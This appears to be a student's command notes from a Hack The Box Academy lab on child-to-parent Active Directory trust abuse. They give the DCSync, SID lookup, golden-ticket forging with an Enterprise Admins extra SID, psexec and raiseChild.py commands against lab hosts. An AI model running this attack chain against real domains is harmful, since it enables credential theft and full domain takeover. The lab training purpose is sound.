#### Performing DCSync with secretsdump.py
```shell-session
Tachipy@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
#### Performing SID Brute Forcing using lookupsid.py

```shell-session
Tachipy@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
```
#### Looking for the Domain SID

```shell-session
Tachipy@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```shell-session
Tachipy@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
#### Constructing a Golden Ticket using ticketer.py

#### Setting the KRB5CCNAME Environment Variable

  Setting the KRB5CCNAME Environment Variable

```shell-session
Tachipy@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
```
```shell-session
Tachipy@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
#### Getting a SYSTEM shell using Impacket's psexec.py

```shell-session
Tachipy@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
#### Performing the Attack with raiseChild.py

```shell-session
Tachipy@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```